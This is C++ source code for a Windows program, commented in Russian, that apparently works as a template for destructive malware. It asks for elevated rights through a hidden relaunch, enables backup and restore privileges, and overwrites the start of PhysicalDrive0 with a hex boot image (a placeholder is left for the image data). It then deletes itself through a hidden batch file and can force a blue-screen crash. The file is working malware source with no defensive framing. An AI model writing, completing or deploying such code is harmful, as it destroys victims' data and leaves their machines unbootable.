#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

const char MBR_HEX[] = "{MBR_DATA}";

// === ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ===
bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, 
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    return isAdmin == TRUE;
}

// === ВЫЗОВ BSOD ===
void TriggerBSOD() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
        NTSTATUS ErrorStatus,
        ULONG NumberOfParameters,
        ULONG UnicodeStringParameterMask,
        PULONG_PTR Parameters,
        ULONG ResponseOption,
        PULONG Response
    );
    
    NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
    if (!NtRaiseHardError) return;
    
    ULONG_PTR params[4] = {0};
    ULONG response = 0;
    
    NtRaiseHardError(
        0xC000021A,
        1,
        0,
        params,
        6,
        &response
    );
}

// === ПОВЫШЕНИЕ ПРАВ ===
void ElevateAndRun() {
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";
    sei.lpFile = GetCommandLineA();
    sei.nShow = SW_HIDE;
    
    if (ShellExecuteExA(&sei)) {
        ExitProcess(0);
    }
}

// === КОНВЕРТЕР HEX ===
std::vector<unsigned char> HexToBytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        unsigned char byte = (unsigned char)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

// === ЗАПИСЬ MBR ===
void WriteMBR() {
    std::string hex(MBR_HEX);
    std::vector<unsigned char> image = HexToBytes(hex);
    
    if (image.size() < 512) return;
    
    // Повышаем привилегии
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValueA(NULL, SE_BACKUP_NAME, &tkp.Privileges[0].Luid);
    LookupPrivilegeValueA(NULL, SE_RESTORE_NAME, &tkp.Privileges[1].Luid);
    LookupPrivilegeValueA(NULL, SE_SECURITY_NAME, &tkp.Privileges[2].Luid);
    tkp.PrivilegeCount = 3;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    tkp.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
    tkp.Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
    
    // Открываем диск
    HANDLE hDisk = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
        NULL
    );
    
    if (hDisk == INVALID_HANDLE_VALUE) {
        hDisk = CreateFileA(
            "\\\\.\\PhysicalDrive0",
            GENERIC_WRITE,
            FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );
        if (hDisk == INVALID_HANDLE_VALUE) return;
    }
    
    // Записываем ВЕСЬ образ (MBR + Stage2)
    DWORD bytesWritten;
    WriteFile(hDisk, image.data(), (DWORD)image.size(), &bytesWritten, NULL);
    CloseHandle(hDisk);
    
    // Самоуничтожение
    char szPath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    std::string batPath = std::string(szPath) + ".bat";
    std::ofstream bat(batPath.c_str());
    bat << "@echo off\n";
    bat << "timeout /t 1 /nobreak > nul\n";
    bat << "del \"" << szPath << "\"\n";
    bat << "del \"" << batPath << "\"\n";
    bat.close();
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    // BSOD
    if (FindResourceA(NULL, "BSOD", "SETTING")) {
        TriggerBSOD();
    }
}

// === ТОЧКА ВХОДА ===
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
    if (!IsAdmin()) {
        ElevateAndRun();
        return 0;
    }
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    WriteMBR();
    
    return 0;
}
